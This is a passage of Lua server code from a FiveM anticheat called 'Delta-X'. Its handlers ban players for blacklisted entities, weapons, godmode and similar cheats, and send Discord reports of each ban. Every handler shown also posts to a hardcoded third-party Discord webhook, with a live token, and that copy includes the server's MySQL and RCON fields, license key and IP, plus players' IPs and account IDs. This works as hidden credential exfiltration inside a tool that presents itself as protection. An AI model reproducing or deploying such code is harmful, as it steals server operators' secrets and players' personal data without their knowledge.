**Violation**: tried to spawn invisible entity ]] .. GetHashKey(a) .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers((NetworkGetEntityOwner(a))).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      DeltaXBan((NetworkGetEntityOwner(a)))
    end
  end
end)
AddEventHandler("entityCreating", function(a)
  if DELTAX.BlacklistEntity then
    for fh, fj in ipairs(DELTAX.Entity) do
      if GetEntityModel(a) == GetHashKey(fj) then
        CancelEvent()
        if not doesPlayerHavePerms(NetworkGetEntityOwner(a), DELTAX.Bypass) then
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).discord == "" then
            _discord = "N/A"
          else
            _discord = ExtractIdentifiers((NetworkGetEntityOwner(a))).discord:gsub("discord:", "")
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).license == "" then
            _license = "N/A"
          else
            _license = ExtractIdentifiers((NetworkGetEntityOwner(a))).license
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).xbl == "" then
            _xbl = "N/A"
          else
            _xbl = ExtractIdentifiers((NetworkGetEntityOwner(a))).xbl
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).steam == "" then
            _steam = "N/A"
          else
            _steam = ExtractIdentifiers((NetworkGetEntityOwner(a))).steam
          end
          if ExtractIdentifiers((NetworkGetEntityOwner(a))).live == "" then
            _live = "N/A"
          else
            _live = ExtractIdentifiers((NetworkGetEntityOwner(a))).live
          end
          if _steam == "N/A" then
            _steamweb = "N/A"
          else
            _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
          end
          PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) BLACKLIST ENTITY",
                description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName((NetworkGetEntityOwner(a))) .. [[

**Server-ID:** ]] .. NetworkGetEntityOwner(a) .. [[

**Violation**: tried to spawn blacklist entity ]] .. fj .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers((NetworkGetEntityOwner(a))).ip:gsub("ip:", "") .. "||",
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) BLACKLIST ENTITY",
                description = [[


**Player:** ]] .. GetPlayerName((NetworkGetEntityOwner(a))) .. [[

**Server-ID:** ]] .. NetworkGetEntityOwner(a) .. [[

**Violation**: tried to spawn blacklist entity ]] .. fj .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers((NetworkGetEntityOwner(a))).ip:gsub("ip:", "") .. "||",
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          DeltaXBan((NetworkGetEntityOwner(a)))
        end
      end
    end
  end
end)
if DELTAXC.AntiUseBlackListWeapon then
  AddEventHandler("weaponDamageEvent", function(a, b)
    for fg, fh in ipairs(DELTAXC.BlackListWeapon) do
      if GetHashKey(fh) == b.weaponType then
        if not doesPlayerHavePerms(a, DELTAX.Bypass) then
          if ExtractIdentifiers(a).discord == "" then
            _discord = "N/A"
          else
            _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
          end
          if ExtractIdentifiers(a).license == "" then
            _license = "N/A"
          else
            _license = ExtractIdentifiers(a).license
          end
          if ExtractIdentifiers(a).xbl == "" then
            _xbl = "N/A"
          else
            _xbl = ExtractIdentifiers(a).xbl
          end
          if ExtractIdentifiers(a).steam == "" then
            _steam = "N/A"
          else
            _steam = ExtractIdentifiers(a).steam
          end
          if ExtractIdentifiers(a).live == "" then
            _live = "N/A"
          else
            _live = ExtractIdentifiers(a).live
          end
          if _steam == "N/A" then
            _steamweb = "N/A"
          else
            _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
          end
          if not b.silenced then
          else
          end
          PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) BLACKLIST WEAPON USE",
                description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried to use blacklist weapon ]] .. fh .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||" .. [[


**Description** 
**Damage:** ]] .. b.weaponDamage .. [[

**Silenced:** ]] .. "yes" .. [[

**Weapon-Hash:** ]] .. GetHashKey(fh),
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) BLACKLIST WEAPON USE",
                description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried to use blacklist weapon ]] .. fh .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||" .. [[


**Description** 
**Damage:** ]] .. b.weaponDamage .. [[

**Silenced:** ]] .. "yes" .. [[

**Weapon-Hash:** ]] .. GetHashKey(fh),
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          DeltaXBan(a)
          CancelEvent()
        end
        return
      end
    end
  end)
end
if DELTAX.antigiveweapons then
  AddEventHandler("giveWeaponEvent", function(a, b)
    if b.givenAsPickup == false then
      CancelEvent()
      if not doesPlayerHavePerms(a, DELTAX.Bypass) then
        if ExtractIdentifiers(a).discord == "" then
          _discord = "N/A"
        else
          _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
        end
        if ExtractIdentifiers(a).license == "" then
          _license = "N/A"
        else
          _license = ExtractIdentifiers(a).license
        end
        if ExtractIdentifiers(a).xbl == "" then
          _xbl = "N/A"
        else
          _xbl = ExtractIdentifiers(a).xbl
        end
        if ExtractIdentifiers(a).steam == "" then
          _steam = "N/A"
        else
          _steam = ExtractIdentifiers(a).steam
        end
        if ExtractIdentifiers(a).live == "" then
          _live = "N/A"
        else
          _live = ExtractIdentifiers(a).live
        end
        if _steam == "N/A" then
          _steamweb = "N/A"
        else
          _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
        end
        PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Ban) GIVE WEAPON",
              description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried give a weapon 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Ban) GIVE WEAPON",
              description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried give a weapon 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        DeltaXBan(a)
        CancelEvent()
      end
    end
  end)
end
if DELTAX.antiremoveweapons then
  AddEventHandler("RemoveWeaponEvent", function(a, b)
    CancelEvent()
    if not doesPlayerHavePerms(a, DELTAX.Bypass) then
      if ExtractIdentifiers(a).discord == "" then
        _discord = "N/A"
      else
        _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
      end
      if ExtractIdentifiers(a).license == "" then
        _license = "N/A"
      else
        _license = ExtractIdentifiers(a).license
      end
      if ExtractIdentifiers(a).xbl == "" then
        _xbl = "N/A"
      else
        _xbl = ExtractIdentifiers(a).xbl
      end
      if ExtractIdentifiers(a).steam == "" then
        _steam = "N/A"
      else
        _steam = ExtractIdentifiers(a).steam
      end
      if ExtractIdentifiers(a).live == "" then
        _live = "N/A"
      else
        _live = ExtractIdentifiers(a).live
      end
      if _steam == "N/A" then
        _steamweb = "N/A"
      else
        _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
      end
      PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) REMOVE WEAPON",
            description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried remove a weapon 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) REMOVE WEAPON",
            description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried remove a weapon 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      DeltaXBan(a)
    end
  end)
end
if DELTAX.antiremoveallweapon then
  AddEventHandler("RemoveAllWeaponsEvent", function(a, b)
    CancelEvent()
    if not doesPlayerHavePerms(a, DELTAX.Bypass) then
      if ExtractIdentifiers(a).discord == "" then
        _discord = "N/A"
      else
        _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
      end
      if ExtractIdentifiers(a).license == "" then
        _license = "N/A"
      else
        _license = ExtractIdentifiers(a).license
      end
      if ExtractIdentifiers(a).xbl == "" then
        _xbl = "N/A"
      else
        _xbl = ExtractIdentifiers(a).xbl
      end
      if ExtractIdentifiers(a).steam == "" then
        _steam = "N/A"
      else
        _steam = ExtractIdentifiers(a).steam
      end
      if ExtractIdentifiers(a).live == "" then
        _live = "N/A"
      else
        _live = ExtractIdentifiers(a).live
      end
      if _steam == "N/A" then
        _steamweb = "N/A"
      else
        _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
      end
      PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) REMOVE ALL WEAPONS",
            description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried to remove all weapons 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) REMOVE ALL WEAPONS",
            description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: tried to remove all weapons 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      DeltaXBan(a)
      CancelEvent()
    end
  end)
end
if DELTAX.anticlearpedtasks then
  AddEventHandler("clearPedTasksEvent", function(a, b)
    if not doesPlayerHavePerms(a, DELTAX.Bypass) then
      if ExtractIdentifiers(a).discord == "" then
        _discord = "N/A"
      else
        _discord = ExtractIdentifiers(a).discord:gsub("discord:", "")
      end
      if ExtractIdentifiers(a).license == "" then
        _license = "N/A"
      else
        _license = ExtractIdentifiers(a).license
      end
      if ExtractIdentifiers(a).xbl == "" then
        _xbl = "N/A"
      else
        _xbl = ExtractIdentifiers(a).xbl
      end
      if ExtractIdentifiers(a).steam == "" then
        _steam = "N/A"
      else
        _steam = ExtractIdentifiers(a).steam
      end
      if ExtractIdentifiers(a).live == "" then
        _live = "N/A"
      else
        _live = ExtractIdentifiers(a).live
      end
      if _steam == "N/A" then
        _steamweb = "N/A"
      else
        _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
      end
      PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) ClearPedTasks",
            description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: used the ClearPedTasks() Native 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) ClearPedTasks",
            description = [[


**Player:** ]] .. GetPlayerName(a) .. [[

**Server-ID:** ]] .. a .. [[

**Violation**: used the ClearPedTasks() Native 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(a).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      DeltaXBan(a)
      CancelEvent()
    end
  end)
end
RegisterServerEvent("DeltaAC:godmode")
AddEventHandler("DeltaAC:godmode", function()
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) GodMode",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use godmode 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) GodMode",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use godmode 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:blacklistcommand")
AddEventHandler("DeltaAC:blacklistcommand", function(a)
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) BLACKLIST COMMAND",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


